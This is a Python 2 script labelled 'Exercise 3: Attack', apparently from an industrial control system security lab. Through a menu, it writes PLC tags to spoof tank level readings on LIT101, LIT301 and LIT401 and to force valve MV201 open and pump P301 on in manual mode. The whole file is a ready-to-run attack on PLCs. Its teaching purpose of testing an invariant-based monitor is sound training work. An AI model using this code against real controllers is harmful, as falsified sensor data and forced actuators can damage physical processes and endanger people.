#!/usr/bin/env python2
"""Exercise 3: Attack

Use pycomm code to launch an attack on
    MV201
    P301
    LIT301
    LIT401

Check the response on the invariant-based monitor.
"""
import os
from sys import exit
from pycomm.ab_comm.clx import Driver as ClxDriver

PLC_IPS = {
    'plc1': '192.168.1.10',
    'plc2': '192.168.1.20',
    'plc3': '192.168.1.30',
    'plc4': '192.168.1.40',
}

def LIT101():
    print("Attacking LIT101...")
    print("Overriding sensor input...")
    write_plc(PLC_IPS['plc1'], 'HMI_LIT101.Sim', True, 'BOOL')
    print("Changing sensor value...")
    write_plc(PLC_IPS['plc1'], 'HMI_LIT101.Sim_PV', 200, 'REAL')

def MV201():
    print("Attacking MV201...")
    print("Switching to manual override...")
    write_plc(PLC_IPS['plc2'], 'HMI_MV201.Auto', False, 'BOOL')
    print("Opening valve...")
    # 1 - close; 2 - open
    write_plc(PLC_IPS['plc2'], 'HMI_MV201.Cmd', 2, 'INT')

def P301():
    print("Attacking P301...")
    print("Switching to manual override...")
    write_plc(PLC_IPS['plc3'], 'HMI_P301.Auto', False, 'BOOL')
    print("Engaging pump...")
    # 1 - stop; 2 - start
    write_plc(PLC_IPS['plc3'], 'HMI_P301.Cmd', 2, 'INT')

def LIT301():
    print("Attacking LIT301...")
    print("Overriding sensor input...")
    write_plc(PLC_IPS['plc3'], 'HMI_LIT301.Sim', True, 'BOOL')
    print("Changing sensor value...")
    write_plc(PLC_IPS['plc3'], 'HMI_LIT301.Sim_PV', 200, 'REAL')

def LIT401():
    print("Attacking LIT401...")
    print("Overriding sensor input...")
    write_plc(PLC_IPS['plc4'], 'HMI_LIT401.Sim', True, 'BOOL')
    print("Changing sensor value...")
    write_plc(PLC_IPS['plc4'], 'HMI_LIT401.Sim_PV', 200, 'REAL')

def Quit():
    print("Quitting")
    exit()

def invalid_option():
    print("Invalid option")

def write_plc(plc_ip, tag_name, value, tag_type):
    plc = ClxDriver()
    if plc.open(plc_ip):
        if plc.write_tag(tag_name, value, tag_type):
            print("Success")
            print("Target: " + plc_ip)
            print("Tag Name: " + tag_name)
            print("Value: " + str(value))
            print("Tag Type: " + tag_type)
        else:
            print("Failed to write to " + plc_ip)
        plc.close()
    else:
        print("Unable to open: ", plc_ip)

def menu():
    TARGETS = {
        '1': LIT101,
        '2': MV201,
        '3': P301,
        '4': LIT301,
        '5': LIT401,
        'q': Quit,
        }
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("PLC Attacker")
        print("============")
        for key, value in sorted(TARGETS.items()):
            print("{}: {}".format(key.upper(), value.__name__))
        target = raw_input("\nSelect an option: ")
        func = TARGETS.get(target.lower(), invalid_option)
        func()
        raw_input("\nPress enter to continue")

if __name__ == '__main__':
    menu()
